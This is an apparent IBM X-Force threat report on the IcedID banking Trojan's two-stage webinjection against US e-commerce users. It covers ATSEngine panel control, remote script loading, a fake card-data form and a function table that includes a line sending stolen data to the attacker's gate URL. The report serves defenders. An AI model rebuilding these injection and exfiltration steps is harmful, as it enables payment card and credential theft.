As part of the ongoing research into cybercrime tools targeting users of financial services
and e-commerce, IBM X-Force analyzes the tactics, techniques and procedures (TTPs) of
organized malware gangs, exposing their inner workings to help diffuse reliable threat
intelligence to the security community.
In recent analysis of IcedID Trojan attacks, our team looked into how IcedID operators target
e-commerce vendors in the U.S., the gang’s typical attack turf. The threat tactic is a two-step
injection attack designed to steal access credentials and payment card data from victims.
Given that the attack is separately operated, it’s plausible that those behind IcedID are either
working on different monetization schemes or renting botnet sections to other criminals,
turning it to a cybercrime-as-a-service operation, similar to the Gozi Trojan’s business model.

IcedID Origins
IBM Security discovered and named IcedID in September 2017. This modern banking Trojan
features similar modules to malware like TrickBot and Gozi. It typically targets banks,
payment card providers, mobile services providers, payroll, webmail and e-commerce sites,
and its attack turf is mainly the U.S. and Canada. In their configuration files, it is evident that
IcedID’s operators target business accounts in search of heftier bounties than those typically
found in consumer accounts.
IcedID has the ability to launch different attack types, including webinjection, redirection and
proxy redirection of all victim traffic through a port it listens on.
The malware’s distribution and infection tactics suggest that its operators are not new to the
cybercrime arena; it has infected users via the Emotet Trojan since 2017 and in test
campaigns launched in mid-2018, also via TrickBot. Emotet has been among the most
notable malicious services catering to elite cybercrime groups from Eastern Europe over the
past two years. Among its dubious customers are groups that operate QakBot, Dridex,
IcedID and TrickBot.

Using ATSEngine to Orchestrate Attacks on E-Commerce Users
While current IcedID configurations feature both webinjection and malware-facilitate
redirection attacks, let’s focus on its two-stage webinjection scheme. This tactic differs from
similar Trojans, most of which deploy the entire injection either from the configuration or on
the fly.
To deploy injections and collect stolen data coming from victim input, some IcedID operators
use a commercial inject panel known as Yummba’s ATSEngine. ATS stands for automatic
transaction system in this case. A web-based control panel, ATSEngine works from an
attack/injection server, not from the malware’s command-and-control (C&C) server. It allows
the attacker to orchestrate the injection process, update injections on the attack server with
2/12

agility and speed, parse stolen data, and manage the operation of fraudulent transactions.
Commercial transaction panels are very common and have been in widespread use since
they became popular in the days of the Zeus Trojan circa 2007.

Targeting Specific E-Commerce Vendors
In the attack we examined, we realized that some IcedID operators are using the malware to
target very specific brands in the e-commerce sphere. Our researchers noted that this attack
is likely sectioned off from the main botnet and operated by criminals who specialize in
fraudulent merchandise purchases and not necessarily bank fraud.
Let’s look at a sample code from those injections. This particular example was taken from an
attack designed to steal credentials and take over the accounts of users browsing to a
popular e-commerce site in the U.S.
As a first step, to receive any information from the attack server, the resident malware on the
infected device must authenticate itself to the botnet’s operator. It does so using a script from
the configuration file. If the bot is authenticated to the server, a malicious script is sent from
the attacker’s ATSEngine server, in this case via the URL home_link/gate.php.
Notice that IcedID protects its configured instructions with encryption. The bot therefore
requires a private key that authenticates versus the attacker’s web-based control panel (e.g.,
var pkey = “Ab1cd23”). This means the infected device would not interact with other C&C
servers that may belong to other criminals or security researchers.

Next, we evaluated the eval(function(p, a, c, k, e, r) function in the communication with the
attack server and got the following code to reveal. Encoding is a common strategy to pack
code and make it more compact.

(source: IBM Trusteer)
This function sets the infected user’s browser to accept external script injections that the
Trojan will fetch from its operator’s server during an active attack.
The following snippet shows the creation of a document object model (DOM) script element
with type Text/javascript and the ID jsess_script_loader. The injection’s developer used this
technique to inject a remote script into a legitimate webpage. It fetches the remote script
from the attacker’s C&C and then embeds it in a script tag, either in the head of the original
webpage or in its body.

Taking a closer look at the function used here, we can see that it loads the script from the
home_link of the ssid= of the infected user’s device, along with the current calendar date.

Steps 1 and 2: JavaScript and HTML
To perform the webinjection, an external script, a malicious JavaScript snippet, is charged
with injecting HTML code into the infected user’s browser. Using this tactic, the malware
does not deploy the entire injection from the configuration file, which would essentially
expose it to researchers who successfully decrypt the configuration. Rather, it uses an initial
injection as a trigger to fetch a second part of the injection from its attack server in real time.
That way, the attack can remain more covert and the attacker can have more agility in
updating injections without having to update the configuration file on all the infected devices.
In the example below, the HTML code, named ccgrab, modifies the page the victim is
viewing and presents social engineering content to steal payment card data. This extra
content on the page prompts the victim to provide additional information about his or her
identity to log in securely.

The malware automatically grabs the victim’s access credentials and the webinjection
requests the following additional data elements pertaining to the victim’s payment card:
Credit card number;
CVV2; and
The victim’s state of residence.
Once the victim enters these details, the data is sent to the attacker’s ATSEngine server in
parsed form that allows the criminal to view and search data via the control panel.

Managing Data Theft and Storage
The malicious script run by the malware performs additional functions to grab content from
the victim’s device and his or her activity. The content grabbing function also checks the
validity of the user’s input to ensure that the C&C does not accumulate junk data over time
and manages the attack’s variables.

Once the data from the user is validated, it is saved to the C&C:

Injection Attack Server Functions
The attack server enables the attacker to command infected bots by a number of functions.
Let’s look at the function list that we examined once we decoded IcedID’s malicious script:
Function name

Purpose

isFrame()

Checks for frames on the website to look for potential third-party
security controls.

7/12

isValidCardNumber(a)

Validates that payment card numbers are correct. This function
is likely based on the Luhn algorithm.

onLoaded()

The main function that sets off the data grabbing process.

addLog(a,b,c,d)

Adds new logs to the reports section in the attack server.

writeLog()

Writes logs to the attack server after validation of the private key
and the victim’s service set identifier (SSID). This is achieved by
the following script: getData(gate_link + a + “&pkey=” +
urlEncode(pkey) + “&ssid=” + b, b)

The attack server enables the operator to use different functions that are sectioned into tabs
on the control panel:
Accounts page functions — shows the account pages the victim is visiting with the
infected user’s credentials.
Content variables — includes report generation, account page controls, pushing HTML
content into pages the victim is viewing, and a comments module to keep track of
activity.
Private functions to get HEX and decode.
Main page functions.
Comments global.
Reports global.

device as it appears to the attacker using the ATSEngine control panel:

Data Management and Views
The ATSEngine control panel enables the attacker to view the active functions with a time
stamp (see Figure 8). The following information is retrieved from the victim’s device and sent
to the attack server:
Last report time from this infected device;
Victim’s IP Address;
Victim’s attributed BotID;
Victim’s login credentials to the website he or she is visiting;
Additional grabbed data from webinjection to the target page, including the victim’s
name, payment card type, card number and CVV2, and state of residence; and
Comments section inserted by the attacker about the particular victim and his or her
accounts.
A view from the control panel displays essential data in tables, providing the attacker with the
victim’s login credentials to the targeted site:

Sectioned IcedID Botnet
Following the analysis of IcedID’s injections and control panel features, our researchers
believe that, much like other Trojan-operating gangs, IcedID is possibly renting out its
infrastructure to other criminals who specialize in various fraud scenarios.
The control panel, a common element in online fraud operations, reveals the use of a
transaction automation tool (ATS) by IcedID’s operators. This commercial panel helps
facilitate bot control, data management and management of fraudulent activity. The panel of
choice here is a longtime staple in the cybercrime arena called the Yummba/ATSEngine.
Fraud scenarios may vary from one operator to another, but IcedID’s TTPs remain the same
and are applied to all the attacks the Trojan facilitates. As such, IcedID’s webinjections can
apply to any website, and its redirection schemes can be fitted to any target.

Sharpened Focus in 2019
While some Trojan gangs choose to expand their attack turf into more countries, this requires
funding, resources to build adapted attack tools, alliances with local organized crime and
additional money laundering operations. In IcedID’s case, it does not appear the gang is
looking to expand. Ever since it first appeared in the wild, IcedID has kept its focus on North
America by targeting banks and e-commerce businesses in that region.
In 2018, IcedID reached the fourth rank on the global financial Trojan chart, having kept up
its malicious activity throughout the year.
